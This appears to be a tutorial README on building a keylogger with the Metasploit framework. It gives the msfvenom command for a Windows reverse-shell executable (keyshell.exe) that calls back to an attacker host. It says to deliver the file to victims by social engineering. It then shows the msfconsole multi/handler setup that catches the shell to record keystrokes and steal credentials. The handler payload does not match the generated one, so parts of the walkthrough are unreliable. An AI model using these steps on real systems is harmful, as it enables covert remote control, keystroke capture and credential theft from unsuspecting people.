Building the keylogger using Metasploit-framework

PART 1
1.Log in to kali linux software
2.The aim is to create a payload called Meterpreter using Inbuilt Metasploit-framework (see- https://www.offsec.com/metasploit-unleashed/meterpreter-basics/)

#Meterpreter is a Metasploit attack payload that provides an interactive shell from which an attacker can explore the target machine and execute code
#Using Meterpreter to generate an executable called keyshell.exe as illustrated before

Metasploit is handy for generating a reverse shell. The following command generates a reverse TCP shell with the Metasploit framework:
It generate a Windows reverse shell executable that will connect back to us on port 4444.

┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.50.2 LPORT=4444 -f exe -o keyshell.exe

  #p - payload (windows/x64/meterpreter/reverse_tcp) 
  #windows/meterpreter/reverse_tcp is one of the most powerful features the Metasploit Framework has to offer
  #It allows you to remotely control the file system, sniff, keylog, hashdump, perform network pivoting, control the webcam and microphone
  #LHOST - Listen Address (Threat actor IP address)
  #LPORT - Listen port (The default is 444, It is advisable to change to another value)
  #f - To outpute the executable file in exe (Window extension)
  #o - To outpute the executable file name to keyshell.exe

PART 2
3. As seen above, the execuitebale file (keyshell.exe) has been created, exe need to be transported to victim system/infrastructure
   #It can be transported to the victim system via Social engineering or more sophisticated ways
   #See previous work or update from seyigate repro! on SET (Social Engineer Toolkits Framework)

PART 3
4. As assume that the hacker had already compromised the victim machine through the payload generated using Metasploit framework as explained above. 
   #Now, hacker can gain more foothold on the machine, launch additional remote and payloads attacks
   #Execute malicious code remotely 
   #Move laterally through the whole system and network infrastructure.
   #Data theft such as admin and elevated account credentials theft, financial loss, reputational damage, and legal penalties

   #See more of seyigate cybersecurity projects for more details. 

   For the purpose of this project, A listener interactive shell will be initiated, this will allows for serving a shell to access
   the targeted machine when the victim sends a TCP connection to record and steal consecutive keystrokes that the user enters on a device.

   #Creating an interactive listener shell

    └─$ msfconsole

    In msfconsole, select an exploit module, which is exploit/multi/handler
    multi/handler exploit is a stub that handles exploits launched outside of the framework.
    it is also a remote exploit module, which can also engage multiple hosts.

    msf6 > use exploit/multi/handler
    [*] Using configured payload generic/shell_reverse_tcp

    msf6 exploit(multi/handler) >show info

    When using the exploit/multi/handler module, we still need to tell it which payload to expect so we configure it to have the same settings as the executable we generated.

    msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
    payload => windows/shell/reverse_tcp
    msf6 exploit(multi/handler) > show options

    Then configure the parameter appropriately
    msf6 exploit(multi/handler) > set LHOST 192.168.50.2
    LHOST => 192.168.50.2
    msf6 exploit(multi/handler) > SET LPORT 4444
    msf6 exploit(multi/handler) > set LPORT 4444
    LPORT => 4444

    Now that we have everything set up and ready to go, 
    We run exploit for the multi/handler and execute our generated executable on the victim. 
    The multi/handler handles the exploit for us and presents us our shell.
